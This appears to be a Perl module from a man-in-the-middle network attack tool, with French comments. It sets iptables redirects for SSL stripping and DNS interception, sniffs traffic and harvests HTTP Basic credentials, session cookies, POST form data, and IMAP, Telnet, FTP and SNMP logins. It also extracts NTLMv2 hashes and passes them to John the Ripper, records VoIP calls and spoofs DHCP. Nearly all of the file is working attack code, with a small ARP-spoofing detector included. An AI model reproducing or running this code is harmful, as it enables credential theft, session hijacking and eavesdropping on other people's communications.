my $DataOnPipe : shared = 0;
my $PasswordOnPipe : shared = 0;
my %ResolvedHosts : shared = ();
my @LogEntry : shared = ();
my @PasswordEntry : shared = ();
my %Captured_Pages : shared = ();
my $Sniffer_Started = 0;
my $voipfh;
my $telnet_tmp;
my $telnet_user;
my $telnet_pass;
my $ftp_username;
my $NetworkListener;
my $i = 1;
my $host;
my $sip_intercepting = 0;
my @rtpport;
my $server_challenge;
my @dontmatch = (".png",".jpeg",".js",".css",".jpg",".bmp",".gif",".swf",".ico",".mp3",".wav",".xml");
my $log = 0;
my $intercept : shared = 0;
#Mise en cache des informations des vendeurs pour les adresses MAC
Net::MAC::Vendor::load_cache("Mac_Cache.txt");

#Fichier de LOG
open(LOGFILE,">>","Capture.log");

#Liste des sessions 
sub GetSessions{
    return %Captured_Pages;
}

# Demarre le thread permettant l'ecoute des packets
sub Start_NetworkListener{
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("iptables -F");
    system("iptables -X");
    system("iptables -t nat -F");
    system("iptables -t nat -X");

    my @CurSettings = GetSettings();

    $NetworkListener = threads->new(\&Start_NetworkListener_Thread);
    $NetworkListener->detach();

    if (8 ~~ @CurSettings)
    {
        system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 8080");
        my $HTTP_SSL_Server = threads->new(\&Start_HTTP_SSL_Server_Thread);
        $HTTP_SSL_Server->detach();
    }

    if (10 ~~ @CurSettings)
    {
        
        system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8001");
        my $HTTP_SSLStrip_Server = threads->new(\&Start_HTTP_Striping_Server_Thread);
        $HTTP_SSLStrip_Server->detach();
        
    }

    if (11 ~~ @CurSettings)
    {
        system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-ports 5456");
        system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p tcp --destination-port 53 -j REDIRECT --to-ports 5456");
        my $DNSServer = threads->new(\&StartDNS_Server_Thread);
        $DNSServer->detach();
        if (!(10 ~~ @CurSettings))
        {
            system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8001");
            my $HTTP_SSLStrip_Server = threads->new(\&Start_HTTP_Striping_Server_Thread);
            $HTTP_SSLStrip_Server->detach();
        }
    }
    $Sniffer_Started = 1;
}

#Obtiens le status du sniffer
sub GetSnifferStatus{
    return $Sniffer_Started;
}

#Arrete l'ecoute du réseau
sub Stop_NetworkListener{

    if ($NetworkListener){
        $NetworkListener->kill('SIGKILL') if $NetworkListener->can('exit'); 
        $Sniffer_Started = 0;
        DrawNotif("Sniffer stopped !");
    }
    else
    {
        DrawNotif("Sniffer not started !");
    }
}

#Ajout des informations sur les pass interceptés
sub AddPassword{
    push(@PasswordEntry, ($_[0]));
    $PasswordOnPipe = 1;
}

#Obtiens la liste des mots de passes
sub GetPasswords{
    return @PasswordEntry;
}

#Vide le PIPE des passwords
sub ClearPasswordPipe {
    @PasswordEntry = ();
}

#Reinitialise le pipe des passwords
sub SetPassPipeStatus{
    $PasswordOnPipe = 0;
}

#Obtiens le status du pipe des passwords
sub GetPassPipeStatus{
    return $PasswordOnPipe;
}


#Ajoute une ligne de log dans le pipe
sub AddLogInfo{
    push(@LogEntry, $_[0]);
    print LOGFILE $_[0];
    $DataOnPipe = 1;
}

#Obtiens les logs
sub GetLog{
    return @LogEntry;
}

#Obtiens le status du pipe des logs
sub GetPipeStatus{
    return $DataOnPipe;
}

#Reinitialise le pipe des logs
sub SetPipeStatus{
    $DataOnPipe = 0;
}

#Vide le pipe des logs
sub ClearPipe{
    @LogEntry = ();
}

#Ajoute un ordinateur resolu dans la table des hotes
sub AddResolvedHost{
    $ResolvedHosts{$_[0]} = $_[1];
}

#Obtiens la liste des hotes resolus
sub GetResolvedHosts{
    return %ResolvedHosts;
}

sub Start_NetworkListener_Thread
{
        $SIG{'KILL'} = sub { print STDERR "Killing...\r\n"; threads->exit(); };
        #On obtiens les parametres selectionnés par l'utilisateur.
        my @Settings = GetSettings();
        #On affiche l'adresse MAC de l'if d'ecoute
        AddLogInfo("Started [MAC : ".get_interface_mac(GetSelectedInterface())."]\n");
        my $localmac = get_interface_mac(GetSelectedInterface());
        #On obtiens l'adresse IP de l'interface d'ecoute.
        my $ipaddress = get_interface_address(GetSelectedInterface());
        #On defini les callbacks
        my $npe = Net::Pcap::Easy->new(
            dev              => GetSelectedInterface(),
            timeout_in_ms    => 0,
            filter => "not ether src $localmac",
            bytes_to_capture    => 1024,
            promiscuous      => 1,
            tcp_callback => sub {
                my ($npe, $ether, $ip, $tcp, $header ) = @_;
                my ($httpown_host,$httpown_page,$httpown_cookie);
                #Interception des sessions HTTP
                if ($ip->{src_ip} ne $ipaddress || $ip->{src_ip} ne $ipaddress)
                {
                    if ($tcp->{dest_port} == 80)
                    {
                        my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                        $log = 0;
                        my @data = split(/\n/,$tcp->{data});

                        foreach my $line (@data)
                        {
                            if ($line =~ m/(GET|POST)/)
                            {
                                my @page = split(" ",$line);
                                if (GoodPage($page[1]))
                                {
                                    $log = 1;
                                    $httpown_page=$page[1];
                                }
                                
                            }
                            if ($log == 1)
                            {
                                if ($line =~ m/Host: /)
                                {
                                    my @hostname = split(" ",$line);
                                    $httpown_host=$hostname[1];
                                }
                                if ($line =~ m/Authorization: Basic/)
                                {
                                    my $authcode = substr $line, 21; 
                                    my $base64decoded = decode_base64($authcode);
                                    AddLogInfo("[$destination][$httpown_host]Auth : $base64decoded\r\n");

                                }
                                #print("$line\r\n");
                                if ($line =~ m/Cookie: /)
                                {
                                    my $httpown_cookie = substr $line, 8; 
                                    $httpown_cookie = CookieEncode($httpown_cookie);
                                    $Captured_Pages{"http://".$httpown_host.$httpown_page} = $httpown_cookie;
                                    AddLogInfo("[$destination][SESSION Cookie] http://".$httpown_host.$httpown_page."\r\n");

                                }
                            }
                            
                       }
                    }
                    #Interception des données POST
                    if ($tcp->{dest_port} == "80" && 1 ~~ @Settings){
                        #print ("TCPDATAX : " .$tcp->{data}."\n");
                        if ($tcp->{data} =~ m/POST/)
                        {
                            my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                            my $tmpost = 0;
                            #AddLogInfo("Got POST Data : " .$tcp->{data}."\n");
                            $datasrc = $tcp->{src_port};
                            my @wrequest = split(/\n/, $tcp->{data});
                            foreach my $line (@wrequest)
                            {
                                if ($line =~ s/Host: // && !($line =~ m/(ad|ads)/))
                                {
                                    $host = $line;
                                    AddLogInfo("[$destination][POST] Request on : $line\n");

                                }
                                if ($line eq "\r")
                                {
                                    $tmpost++;
                                }
                                elsif ($tmpost)
                                {
                                    my @tmp = split(/&/, $line);         
                                    foreach my $data (@tmp){
                                        if ($data =~ /=/)
                                        {
                                            $data = uri_unescape($data);
                                            $data =~ s/\+/ /g;
                                            AddLogInfo("[$destination][POST] $host : $data\n");
                                            AddPassword("[$destination][$host][HTTP/POST] Parameter : ".$data."");
                                        }
                                      
                                    }
                                    $tmpost = 0;
                                }
                            }
                        }
                        elsif ($datasrc and $datasrc eq $tcp->{src_port})
                        {
                            my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                            #AddLogInfo("RETRANSMISSION TCP : " .$tcp->{data}." DONE \n");
                            #print STDERR "RETRANSMISSION TCP : ".$tcp->{data}."\n";
                            #AddLogInfo($tcp->{data}."\n");
                            my @tmp = split(/&/, $tcp->{data});         
                            foreach my $data (@tmp){
                                if ($data =~ /=/)
                                {
                                    $data = uri_unescape($data);
                                    $data =~ s/\+/ /g;
                                    AddLogInfo("[$destination][POST] $host : $data\n");
                                    AddPassword("[$destination][$host][HTTP/POST] Parameter : ".$data."");
                                }
                              
                            }
                            $datasrc = 0;
                        }
                         
                    }
                    #Interception des identifiants IMAPs
                    elsif ($tcp->{dest_port} == 143 && 6 ~~ @Settings)
                    {
                        my $login_packet =($ether->{data});
                        my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                        my $pack_hex = unpack("H*", $login_packet);
                        my $pack_type=index($pack_hex, "6c6f");
                            
                        if ($pack_type != -1)
                        {
                            my $packet_offset = substr $pack_hex, $pack_type; 
                            my $packet_final = pack("H*",$packet_offset);
                            my @logins= split (/ /, $packet_final); 
                            AddLogInfo("[IMAP][$destination] ".$logins[0].":".$logins[1]." - Password: ".$logins[2]."\n");
                            AddPassword("[$destination] [IMAP] User : ".$logins[1]." Password : ".$logins[2]."");
                        }
                    }
                    #Interception des identifiants TELNET
                    elsif ($tcp->{dest_port} == "23" && 5 ~~ @Settings){
                        my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                        if ($tcp->{data} =~ /[a-zA-Z0-9]/)
                        {
                            $telnet_tmp .= $tcp->{data};
                        }
                        elsif ($tcp->{data} =~ /\r/)
                        {
                            if ($passmatch == 0)
                            {
                                AddLogInfo("[Telnet][$destination] LOGIN IS : $telnet_tmp\n");
                                $telnet_user = $telnet_tmp;
                            }
                            else
                            {
                                AddLogInfo("[Telnet][$destination] PASSWORD IS : $telnet_tmp\n");
                                AddPassword("[$destination] [TELNET] User : ".$telnet_user." Password : ".$telnet_pass."");
                                $telnet_user = "";
                                $telnet_pass = "";
                                $passmatch = 0;
                            }
                            $telnet_tmp = "";
                            $passmatch = 1;
                        }
                        
                    }
                    #Interception des identifiants FTPs
                    elsif ($tcp->{dest_port} == 21 && 4 ~~ @Settings)
                    {        
                        if ($tcp->{data})
                        {
                            my $data = $tcp->{data};
                            my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                            my @table = split(" ",$data);
                            if (exists($table[0]) && $table[0] eq 'USER' && exists($table[1]))
                            {
                                $ftp_username = $table[1];
                            }
                            if(exists($table[0])&& $table[0]  eq 'PASS' && exists($table[1]))
                            {
                                AddLogInfo("[FTP][$destination] USER : ".$ftp_username." PASS : ".$table[1] ."\n");
                                AddPassword("[$destination] [FTP] Username : ".$ftp_username." Password : ".$table[1]."");
                            }
                        }
                    }
                    #Interception de NTLMv2 et crack avec John
                    elsif (($tcp->{dest_port} == 445 || $tcp->{src_port} == 139 || $tcp->{src_port} == 445 || $tcp->{dest_port} == 139) && 3 ~~ @Settings)
                    {
                        my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                        my $packet = ($ether->{data});
                        my $pack_hex = unpack("H*", $packet );
                        my $pack_find_NTLMSSP=index($pack_hex, "4e544c4d535350");
                        my $pack_type1=index($pack_hex, "4e544c4d535350000100");
                        my $pack_type2=index($pack_hex, "4e544c4d535350000200");
                        my $pack_type3=index($pack_hex, "4e544c4d5353500003000000");
                        my $packet_offset = substr $pack_hex, $pack_type3; 
                        if ($pack_find_NTLMSSP != -1)
                        {
                            if ($pack_type2 != -1)
                            {
                                my $pack_challenge = unpack("H*", $packet);
                                my $pack_type_challenge=index($pack_challenge, "1582");
                                $server_challenge= $pack_type_challenge + 8;
                                $server_challenge = substr $pack_challenge, $server_challenge, "16";
                                AddLogInfo("[NTLM][$destination] Got Server Challenge\n");
                            }
                            if ($pack_type3 != -1)
                            {
                                AddLogInfo("[NTLM][$destination] Got NTLMv2 Packet\n");
                                my $Ntlmssp_packet  = substr $pack_hex, $pack_type3+24;
                                my $lenght_hex = substr $Ntlmssp_packet,0,4;
                                my $maxlenght_hex = substr $Ntlmssp_packet,4,4;
                                my $offset_hex= substr $Ntlmssp_packet,8,8;
                                my $offset = no_null_bytes($offset_hex);
                                my $maxlenght = no_null_bytes($maxlenght_hex);
                                my $lenght = no_null_bytes($lenght_hex);
                                my $lan_manager_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));
                                my $lenght_Response = substr $Ntlmssp_packet,16,4;
                                my $maxlenght_Response = substr $Ntlmssp_packet,20,4;
                                my $offset_Response= substr $Ntlmssp_packet,24,8;

                                $offset = no_null_bytes($offset_Response);
                                $maxlenght = no_null_bytes($maxlenght_Response);
                                $lenght = DecodeGUINT32($lenght_Response);
                                my $Ntlm_Response_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));
                                my $place= index ($Ntlm_Response_hex, "0101000");
                                my $resplen = ($lenght*2) - $place;
                                my $hmac= substr $Ntlm_Response_hex, "0", "32";
                                my $lan= substr $Ntlm_Response_hex,$place,$resplen;
                                my $lenght_domain = substr $Ntlmssp_packet,32,4;

                                my $maxlenght_domain = substr $Ntlmssp_packet,36,4;
                                my $offset_domain= substr $Ntlmssp_packet,40,8;
                                $offset_domain = no_null_bytes($offset_domain);
                                $maxlenght_domain = no_null_bytes($maxlenght_domain);
                                $lenght_domain = no_null_bytes($lenght_domain);
                                $offset_domain = (DecodeGUINT32($offset_domain));
                                my $lenght_username = substr $Ntlmssp_packet,48,4;
                                my $maxlenght_username = substr $Ntlmssp_packet,52,4;
                                my $offset_username= substr $Ntlmssp_packet,56,8;
                                $offset_username = no_null_bytes($offset_username);
                                $maxlenght_username = no_null_bytes($maxlenght_username);
                                $lenght_username = no_null_bytes($lenght_username);
                                $offset_username = (DecodeGUINT32($offset_username));
                                my $username_hex = substr $packet_offset,$offset_username + $offset_username,(hex($maxlenght_username)) + (hex($maxlenght_username));
                                my $domain_hex = substr $packet_offset, $offset_domain + $offset_domain, (hex($maxlenght_domain)) + (hex($maxlenght_domain));
                                my $username = pack("H*", $username_hex);
                                my $domain = pack("H*", $domain_hex);
                                my @item1 = ($domain, $server_challenge, $hmac, $lan);
                                my $mix = join (":", @item1);
                                my @item2 = ($username,$mix);
                                my $mix_final = join("::",@item2);
                                $mix_final =~ s/\0//g;
                                #print $mix_final."\r\n";   
                                AddLogInfo("[NTLMv2][$destination] - $mix_final\n");
                                open(NTLFD,">","ntlm_hash.txt");
                                print NTLFD $mix_final."\r\n";
                                close(NTLFD);
                                system("(xterm -hold -e john --format=netntlmv2 ntlm_hash.txt &) 2> /dev/null");
                            }
                        }
                    }
                }
            },

            udp_callback => sub {
                my ($npe, $ether, $ip, $udp, $header ) = @_;
                if ($ip->{src_ip} ne $ipaddress || $ip->{src_ip} ne $ipaddress)
                {
                    #Interception de la VoIP
                    if ($udp->{dest_port} == 5060 && 2 ~~ @Settings)
                    {
                        my $pkt = Net::SIP::Packet->new( $udp->{data} );
                        my $callid = $pkt->callid();
                        #Creation d'un fichier lors de la reception d'une invitation.
                        if ($pkt->cseq() =~ m/INVITE/)
                        {
                            AddLogInfo("SIP INVITE REQUEST FROM $callid!\n");
                            if ($sip_intercepting == 0)
                            {
                                open($voipfh, ">".strftime("%Y-%m-%d_%H:%M:%S_".$callid."_audio", localtime()));
                                #open(SIPFDDATA, ">".strftime("%Y-%m-%d_%H:%M:%S_".$callid."_data", localtime()));
                                $sip_intercepting = 1;
                            }
                        }
                        #Fermeture du fichier à la fermeture des connexions SIP.
                        if ($pkt->cseq() =~ m/BYE/)
                        {
                            AddPassword("[$callid] [SIP/RTP] SIP Connection closed.");
                            AddLogInfo("SIP BYE REQUEST FROM $callid!\n");
                            if ($voipfh)
                            {
                                close($voipfh);
                                #close(SIPFDDATA);
                                @rtpport = ();
                                $sip_intercepting = 0;
                            }

                        }
                        #Obtiens les ports d'ecoute SIP
                        if ($pkt->sdp_body){
                            my $sdp = $pkt->sdp_body;
                            my @media = $sdp->get_media;
                            foreach (@media) {
                                push(@rtpport,$_->{port});
                                AddLogInfo("SIP Audio Transmission detected at port : " .$_->{port}." \n");
                            } 
                        }
                    }
                    #Ecriture du payload dans le fichier
                    if ($udp->{src_port} ~~ @rtpport)
                    {
                            my $rtppacket = new Net::RTP::Packet($udp->{data});
                            if ($rtppacket->payload_type < 24)
                            {
                                print $voipfh $rtppacket->payload;
                            }
                            else
                            {
                                #print SIPFDDATA $rtppacket->payload;
                            }
                    }
                    #Module DHCP Spoofing
                    elsif ($udp->{dest_port} == 67 && 12 ~~ @Settings)
                    {
                        AddLogInfo("[SITM] Got DHCP Request from ".MacFormat($ether->{src_mac})."!\n");
                        if ($udp->{data})
                        {
                            my $packet = Net::DHCP::Packet->new($udp->{data});
                            if ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 1)
                            {
                                ForgeDHCPServer($packet->xid(),"192.168.0.$i",get_interface_address(GetSelectedInterface()),DHCPOFFER(),$ether->{src_mac});
                            }
                            elsif ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 3)
                            {
                                ForgeDHCPServer($packet->xid(),"192.168.0.$i",get_interface_address(GetSelectedInterface()),DHCPACK(),$ether->{src_mac});
                                $i++;
                            }
                        }
                    }
                    #SNMP Community Stealer
                    elsif ($udp->{dest_port} == 161 && 7 ~~ @Settings)
                    {
                        my $destination = $ip->{src_ip}. " --> ".$ip->{dest_ip};
                        my $packet = unpack("H*",$udp->{data}) =~ m/(.*?)(a0|a1)/;
                        if ($1)
                        {
                            my ($version,$community) = unpack('x4cx2a*' , pack("H*",$1));
                            if ($version < 3)
                            {
                                AddLogInfo("[SNMP][$destination] Version : ".($version+1)." - Community : $community\n");
                                AddPassword("[$destination] [SNMP Version : ".($version+1)."] Community : $community");
                            }
                        }
                    }
                }
                
            },

            arp_callback => sub {
                my ($npe, $ether, $arp, $header) = @_;
                
                my $ipsrc = IPFormat($arp->{spa});
                my $macsrc = MacFormat($arp->{sha});
                my $PromiscuousTimeStamp = GetPromiscStatus();
                #Si le module de defense est actif, comparer les adresses de la table.
                if (GetARPWatchStatus() == 1)
                {
                    if ($ResolvedHosts{$ipsrc})
                    {
                        if ($ResolvedHosts{$ipsrc} ne $macsrc)
                        {
                            AddLogInfo("/!\\ALERT/!\\ POSSIBLE ARP SPOOFING/POISONING ATTACK !\n");
                            AddLogInfo("/!\\ALERT/!\\ SPOOFED IP : ".$iprsc."\n");
                            AddLogInfo("/!\\ALERT/!\\ ORIGINAL MAC : ".$ResolvedHosts{$ipsrc}."\n");
                            AddLogInfo("/!\\ALERT/!\\ CHANGED MAC : ".$macsrc."\n");

                        }
                    }
                }
                if ($arp->{opcode} == 2 && $PromiscuousTimeStamp > 0)
                {   
                    if ($PromiscuousTimeStamp + 8 > time)
                    {
                        if ($ResolvedHosts{$ipsrc})
                        {
                            if (13 ~~ @Settings)
                            {
                                my $hostname = ResolveHostName($ipsrc);
                                AddLogInfo("[PROMISCUOUS] /!\\ Possible sniffer /!\\ IP : $ipsrc MAC : $macsrc Host : $hostname\n");
                            }
                            else
                            {
                                AddLogInfo("[PROMISCUOUS] /!\\ Possible sniffer /!\\ IP : $ipsrc MAC : $macsrc\n");
                            }
                        }
                    }
                   
                }
                #On ajoute l'IP source et l'adresse MAC quand un packet ARP Reply est capturé.
                if ($macsrc ne $localmac)
                {
            		
                    if (!$ResolvedHosts{$ipsrc})
                    {
                		
                        
                        if (13 ~~ @Settings)
                        {
                            my $hostname = ResolveHostName($ipsrc);
                            AddLogInfo("MAC=$macsrc [ ".LookupMacVendor($macsrc)." ], resolved IP Address : $ipsrc [ ".$hostname." ]\n");
                        }
                        else
                        {
                            AddLogInfo("MAC=$macsrc [ ".LookupMacVendor($macsrc)." ], resolved IP Address : $ipsrc \n");
                        }
                        AddResolvedHost($ipsrc,$macsrc);
                    }
                }
                
            }
        );
        #Affiche les informations sur le réseau.
        AddLogInfo("Network IP : " .$npe->network ."\n");
        AddLogInfo("Netmask : " .$npe->netmask ."\n");
        my $block = GetLocalNetInfo($npe->network, $npe->netmask);
        AddLogInfo("SITM Network Listener [".$block->first()."][".$block->last()."] started.\n");

        1 while $npe->loop;
    
}

#Retourne les informations sur la plage réseau
sub GetLocalNetInfo {
    my $block = new Net::Netmask($_[0],$_[1]);
    return $block;
}

#Formate l'adresse IP en un format lisible
sub IPFormat
{
    return join ".", map { hex }($_[0] =~ /([[:xdigit:]]{2})/g)
}

#Formate l'adresse MAC en un format lisible
sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}

#Permet d'obtenir l'adresse IP d'une interface
sub get_interface_address
{
    my ($iface) = @_;
    my $socket;
    socket($socket, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2]) || die "unable to create a socket: $!\n";
    my $buf = pack('a256', $iface);
    if (ioctl($socket, SIOCGIFADDR(), $buf) && (my @address = unpack('x20 C4', $buf)))
    {
        return join('.', @address);
    }
    return undef;
}

#Permet d'obtenir l'adresse MAC d'une interface
sub get_interface_mac
{
    $if = $_[0];
    $localmac = `ifconfig $if | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`;
    return $localmac;
}

#Retourne le nom d'hote résolu
sub ResolveHostName {
    my $hostname = gethostbyaddr(inet_aton($_[0]), AF_INET);
    if ($hostname)
    {
    return $hostname;
    }
    else
    {
    return "Unknown";
    }
}

#Retourne le constructeur de la carte réseau à partir de l'adresse MAC.
sub LookupMacVendor {
    my $vendor = Net::MAC::Vendor::lookup( $_[0] );
    if (@$vendor[0])
    {
        return @$vendor[0];
    }
    else
    {
        return "Unknown"
    }
}

#Supprime les nullbytes pour les packets NTLMSSP
sub no_null_bytes
{
    if (!($_[0] =~ /00/))
    {
        return $_[0];
    }
    my $i=0;
    my $chaine_final = "";
    my $chaine_bla;
    do
    {
        $chaine_bla=$chaine_bla.$chaine_final;
        $chaine_final=  substr $_[0],$i,2;
        
        $i=$i+2;
    }
    while ($chaine_final ne "00");
    return $chaine_bla;
}

#Decode les INT32 Bits non signés pour NTLM.
sub DecodeGUINT32{
    my $entity_unicode = decode("UTF-32LE", pack('H8', $_[0]));
    return ord($entity_unicode);
}

#Verifie que la page est utile
sub GoodPage {
    my $page = $_[0];
    foreach my $ext (@dontmatch)
    {
        if ($page =~ /$ext/)
        {
            return 0;
        }
    }
    return 1;
}

#Encode le cookie afin de pouvoir le reutiliser.
sub CookieEncode {
    my $split = ($_[0]);
    $split =~ s/%3D/=/g;
    $split =~ s/%3B\+/; /g;
    $split =~ s/\r//g;
    $split =~ s/\n//g;
    return $split;
}

return 1;